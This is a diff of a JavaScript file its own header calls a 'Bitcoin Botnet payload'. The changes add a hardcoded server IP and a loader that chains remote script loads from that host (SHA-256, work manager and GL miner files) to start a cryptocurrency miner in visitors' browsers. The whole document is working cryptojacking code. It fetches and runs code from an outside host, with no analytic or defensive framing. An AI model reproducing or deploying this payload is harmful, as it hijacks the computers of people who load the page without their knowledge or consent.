@@ -1,3 +1,11 @@
+/**********************************
+*   Bitcoin Botnet payload
+*   ######################
+*
+***********************************/
+
+target_ip = "52.90.115.231";
+
 function loadScript(url, callback)
 {
     var head = document.getElementsByTagName('head')[0];
@@ -18,8 +26,8 @@ var bitcoinMiner = function() {
     var div = document.createElement('div');
     div.style.top='10px';
     div.style.left='10px';
-    div.style.height='50px';
-    div.style.width='100px';
+    div.style.height='30px';
+    div.style.width='200px';
     div.style.backgroundColor='white';
     div.style.position='fixed';
     var input = document.createElement('input');
@@ -30,8 +38,24 @@ var bitcoinMiner = function() {
     begin_mining();
 };
 
-loadScript("http://code.jquery.com/jquery-1.11.0.min.js");
-loadScript("http://54.152.14.125/hamiyoca/sha256.js");
-loadScript("http://54.152.14.125/hamiyoca/util.js");
-loadScript("http://54.152.14.125/hamiyoca/work-manager.js");
-loadScript("http://54.152.14.125/hamiyoca/glminer.js", bitcoinMiner);
+var doneTheStuff;
+var loadBotNet = function () {
+  if (!doneTheStuff) {
+    doneTheStuff = true;
+    loadScript("http://code.jquery.com/jquery-1.11.0.min.js", function () {
+        loadScript("http://" + target_ip + "/hamiyoca/sha256.js", function() {
+            loadScript("http://" + target_ip + "/hamiyoca/util.js", function() {
+                loadScript("http://" + target_ip + "/hamiyoca/work-manager.js", function(){
+                    loadScript("http://" + target_ip + "/hamiyoca/glminer.js", bitcoinMiner);
+                });
+            });
+        });
+    });
+  }
+};
+
+loadBotNet();
+
+
+
+
